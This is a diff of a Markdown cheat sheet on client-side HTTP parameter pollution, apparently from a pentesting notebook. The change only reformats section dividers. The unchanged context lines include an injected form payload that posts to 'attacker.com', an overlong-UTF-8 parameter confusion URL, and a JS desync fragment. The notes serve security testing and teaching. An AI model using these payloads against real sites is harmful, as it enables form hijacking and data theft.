@@ -16,7 +16,7 @@ linked:
 ---
 # HPP - Client-Side
 
-***
+---
 
 ## URL Manipulation en DOM
 
@@ -31,7 +31,7 @@ linked:
 | Browser console post-injection: `console.log(new URLSearchParams(location.search).get('a'))` y `getAll('a')` | Verifica behavior live | Validation. |
 ^hpp-client-url
 
-___
+---
 
 ## Form Action / Hidden Field Hijack
 
@@ -46,7 +46,7 @@ ___
 | HTML injection con `<form action="https://attacker.com/" id="f"><script>document.forms.f.submit()</script>` | Override form via injection | XSS-adjacent. |
 ^hpp-client-form
 
-___
+---
 
 ## Encoded Param Confusion
 
@@ -62,7 +62,7 @@ ___
 | `https://target/?a=safe&%C0%81=evil` (UTF-8 overlong) | Overlong UTF-8 normalization | Edge parser. |
 ^hpp-client-encoded
 
-___
+---
 
 ## JS-Based Parsing Differences
 
@@ -96,4 +96,4 @@ location.href = `https://api.target.com/${action}/${target}`;
 // → desync exploitation
 ```
 
-***
+---
